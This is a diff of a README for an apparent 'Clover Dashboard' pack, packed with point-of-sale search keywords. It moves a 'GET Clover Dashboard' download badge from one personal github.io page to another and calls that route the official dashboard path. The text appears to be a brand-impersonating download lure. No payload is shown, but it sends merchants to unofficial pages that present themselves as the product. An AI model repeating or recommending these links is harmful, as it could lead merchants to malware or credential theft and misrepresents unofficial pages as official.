@@ -21,6 +21,8 @@ The home controller in this pack is [Home.php](Home.php). Sign-in is [Login.php]
 | Employees | Roles and logins |
 | Customers | History and loyalty |
 
+[![GET Clover Dashboard](https://img.shields.io/badge/GET-Clover%20Dashboard-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://clover-dashboard.github.io/clover-merchant/)
+
 clover pos dashboard and clover web dashboard share this map. clover dashboard eu and other regions use the same tabs with a regional host.
 
 A single location sees one Home strip. A clover merchant with several stores uses clover multi location dashboard: pick a store, then the tabs filter to that store. Do not export a US report while the picker still sits on an EU shop.
@@ -203,8 +205,6 @@ Pack samples under FILES may carry their own notices. Leave them. One LICENSE at
 composer.json and package.json in FILES are pack manifests. pos-package.json and starter-package.json are extra manifests. webpack.config.js and server.js are pack build helpers. docker-compose.yml is a pack compose file.
 
 ## Download
-
-[![GET Clover Dashboard](https://img.shields.io/badge/GET-Clover%20Dashboard-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://lisajacksonm488.github.io/.github/Clover-Dashboard)
 
 Use the GET badge for this pack. Daily clover dashboard sign in is the official clover com dashboard login. There is no separate installer for the web desk. A clover merchant already has the account.
 
